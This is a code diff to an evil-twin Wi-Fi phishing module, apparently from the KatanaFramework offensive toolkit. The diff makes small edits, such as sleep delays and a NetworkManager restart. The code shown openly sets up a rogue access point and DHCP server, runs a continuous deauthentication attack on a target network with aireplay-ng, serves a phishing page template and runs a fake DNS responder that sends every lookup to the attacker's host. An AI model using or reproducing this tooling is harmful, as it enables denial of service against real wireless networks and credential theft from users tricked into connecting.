@@ -8,7 +8,7 @@ from core.KATANAFRAMEWORK import *    #
 
 # LIBRARIES  
 from core.Function import get_interfaces,get_monitors_mode,checkDevice,CheckAPmode,Subprocess,status_cmd
-import commands,socket
+import commands,socket,time
 # END LIBRARIES 
 
 # INFORMATION MODULE
@@ -18,7 +18,7 @@ def init():
 	init.Description        ="Wifi Phising (evil twin)"
 	init.CodeName           ="wifi/ev.twin"
 	init.DateCreation       ="31/05/2016"      
-	init.LastModification   ="31/05/2016"
+	init.LastModification   ="10/06/2016"
 	init.References         =None
 	init.License            =KTF_LINCENSE
 	init.var                ={}
@@ -93,15 +93,18 @@ def main(run):
 		printAlert(0,"Coping Files to Server                   "+status_cmd("cp -r "+init.var['template']+"* "+PATCH_WWW))
 		printAlert(0,"Starting Access Point ["+init.var['essid']+"]")
 		Subprocess("hostapd tmp/hostapd.conf")
+		time.sleep(3)
 		printAlert(0,"Starting DHCP server")
 		Subprocess("dhcpd -d -f -cf tmp/dhcpd.config")
+		time.sleep(3)
 		printAlert(0,"Starting DOS attack to "+init.var['bssid'])
 		Subprocess("aireplay-ng -0 0 -a "+init.var['bssid']+" "+init.var['drive'])
-		print(printAlert(8,"(PRESS Ctrol+C) to stop DOS Attack\n"))
+		print(printAlert(8,"(PRESS Ctrol+C) to stop Attack"))
 		DNSFAKE()
 		commands.getoutput("killall dhcpd")
 		commands.getoutput("killall hostapd")
 		commands.getoutput("killall aireplay-ng")
+		commands.getoutput("service NetworkManager start")
 		commands.getoutput("iptables --flush")
 		commands.getoutput("iptables --table nat --flush")
 		commands.getoutput("iptables --delete-chain")
@@ -151,7 +154,7 @@ def DNSFAKE():
       data, addr = udps.recvfrom(1024)
       p=DNSQuery(data)
       udps.sendto(p.respuesta(ip), addr)
-      printAlert(0,"from "+str(addr[0])+' Request: %s -> %s' % (p.dominio, ip))
+      print "  | from "+str(addr[0])+' Request: %s -> %s' % (p.dominio, ip)
   except KeyboardInterrupt:
     printAlert(0,'Stoping')
     udps.close()
